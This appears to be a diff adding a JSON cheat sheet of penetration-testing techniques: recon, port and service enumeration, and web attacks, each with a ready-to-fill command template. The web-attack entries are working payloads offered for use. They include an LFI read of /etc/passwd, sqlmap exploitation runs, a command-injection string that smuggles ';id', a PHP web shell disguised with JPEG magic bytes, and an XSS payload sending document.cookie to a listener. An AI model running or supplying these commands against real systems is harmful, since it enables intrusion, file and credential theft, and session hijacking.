@@ -1,0 +1,40 @@
+[
+  {
+    "category": "Recon",
+    "techniques": [
+      {"id":"recon_1","name":"Whois Lookup","purpose":"Gather domain registration info","when_to_use":"Early recon on a domain target","command":"whois {TARGET_DOMAIN}","tags":["recon","osint"]},
+      {"id":"recon_2","name":"DNS Enumeration","purpose":"Find subdomains and DNS records","when_to_use":"When targeting a domain","command":"dig any {TARGET_DOMAIN} @8.8.8.8","tags":["recon","dns"]},
+      {"id":"recon_3","name":"Subdomain Brute Force","purpose":"Discover hidden subdomains","when_to_use":"Web app recon phase","command":"gobuster dns -d {TARGET_DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt","tags":["recon","dns"]},
+      {"id":"recon_4","name":"theHarvester OSINT","purpose":"Collect emails, subdomains, IPs from public sources","when_to_use":"Passive recon phase","command":"theHarvester -d {TARGET_DOMAIN} -b all","tags":["recon","osint"]},
+      {"id":"recon_5","name":"Reverse DNS Lookup","purpose":"Find hostname from IP","when_to_use":"When you have an IP and need the hostname","command":"nslookup {TARGET_IP}","tags":["recon","dns"]}
+    ]
+  },
+  {
+    "category": "Enumeration",
+    "techniques": [
+      {"id":"enum_1","name":"Full TCP Port Scan","purpose":"Discover all open TCP ports","when_to_use":"Initial scan on target","command":"nmap -p- --min-rate 5000 -sV -sC -oN nmap_full.txt {TARGET_IP}","tags":["nmap","enumeration"]},
+      {"id":"enum_2","name":"Top 1000 Ports Quick Scan","purpose":"Fast initial port discovery","when_to_use":"Quick first look at target","command":"nmap -sV -sC --open -oN nmap_quick.txt {TARGET_IP}","tags":["nmap","enumeration"]},
+      {"id":"enum_3","name":"UDP Scan","purpose":"Discover open UDP services","when_to_use":"After TCP scan, check for SNMP/DNS/TFTP","command":"sudo nmap -sU --top-ports 200 {TARGET_IP}","tags":["nmap","udp"]},
+      {"id":"enum_4","name":"Web Directory Brute Force","purpose":"Find hidden directories and files","when_to_use":"When a web server is running","command":"gobuster dir -u http://{TARGET_IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -o gobuster.txt","tags":["web","gobuster"]},
+      {"id":"enum_5","name":"FFUF Vhost Fuzzing","purpose":"Discover virtual hosts","when_to_use":"When target uses name-based vhosting","command":"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H 'Host: FUZZ.{TARGET_DOMAIN}' -fs 0","tags":["web","ffuf","vhost"]},
+      {"id":"enum_6","name":"Nikto Web Scan","purpose":"Detect web vulnerabilities and misconfigs","when_to_use":"Web server enumeration","command":"nikto -h http://{TARGET_IP}","tags":["web","nikto"]},
+      {"id":"enum_7","name":"SNMP Enumeration","purpose":"Extract system info via SNMP","when_to_use":"When UDP 161 is open","command":"snmpwalk -v2c -c public {TARGET_IP}","tags":["snmp","enumeration"]},
+      {"id":"enum_8","name":"LDAP Enumeration","purpose":"Dump AD users and objects","when_to_use":"When LDAP (389) is open on a DC","command":"ldapsearch -x -H ldap://{TARGET_IP} -b 'DC={TARGET_DOMAIN},DC=local' -s sub '(objectClass=*)' 2>/dev/null | grep -E 'dn:|sAMAccountName'","tags":["ldap","ad"]},
+      {"id":"enum_9","name":"RPC Enumeration","purpose":"Enumerate users via RPC","when_to_use":"When port 135/445 is open","command":"rpcclient -U '' -N {TARGET_IP} -c 'enumdomusers'","tags":["rpc","smb"]},
+      {"id":"enum_10","name":"FTP Anonymous Login","purpose":"Check for anonymous FTP access","when_to_use":"When FTP (21) is open","command":"ftp {TARGET_IP}","tags":["ftp","enumeration"]}
+    ]
+  },
+  {
+    "category": "Web Attacks",
+    "techniques": [
+      {"id":"web_1","name":"SQLMap Auto Exploit","purpose":"Detect and exploit SQL injection","when_to_use":"When a parameter is potentially injectable","command":"sqlmap -u 'http://{TARGET_IP}/page?id=1' --dbs --batch --level 3 --risk 2","tags":["sqli","sqlmap"]},
+      {"id":"web_2","name":"SQLMap with POST data","purpose":"Test POST parameters for SQLi","when_to_use":"Login forms or POST-based inputs","command":"sqlmap -u 'http://{TARGET_IP}/login' --data='user={USERNAME}&pass={PASSWORD}' --dbs --batch","tags":["sqli","sqlmap"]},
+      {"id":"web_3","name":"LFI Basic Test","purpose":"Read local files via path traversal","when_to_use":"When a file parameter exists in URL","command":"curl 'http://{TARGET_IP}/page?file=../../../../etc/passwd'","tags":["lfi","web"]},
+      {"id":"web_4","name":"LFI via PHP Filter","purpose":"Read PHP source code via base64","when_to_use":"When LFI exists and target runs PHP","command":"curl 'http://{TARGET_IP}/page?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d","tags":["lfi","php"]},
+      {"id":"web_5","name":"File Upload Bypass (Magic Bytes)","purpose":"Bypass file type checks","when_to_use":"When upload only allows images","command":"echo -e '\\xff\\xd8\\xff<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg","tags":["upload","bypass"]},
+      {"id":"web_6","name":"Command Injection Test","purpose":"Execute OS commands via web input","when_to_use":"When user input is passed to OS commands","command":"curl 'http://{TARGET_IP}/ping?ip=127.0.0.1;id'","tags":["cmdi","web"]},
+      {"id":"web_7","name":"XSS Cookie Steal","purpose":"Steal session cookies via XSS","when_to_use":"When reflected/stored XSS exists","command":"<script>document.location='http://{TARGET_IP}:8080/?c='+document.cookie</script>","tags":["xss","web"]},
+      {"id":"web_8","name":"FFUF Parameter Fuzzing","purpose":"Discover hidden GET parameters","when_to_use":"When fuzzing web app parameters","command":"ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://{TARGET_IP}/page?FUZZ=test' -fs 0","tags":["ffuf","web"]}
+    ]
+  }
+]
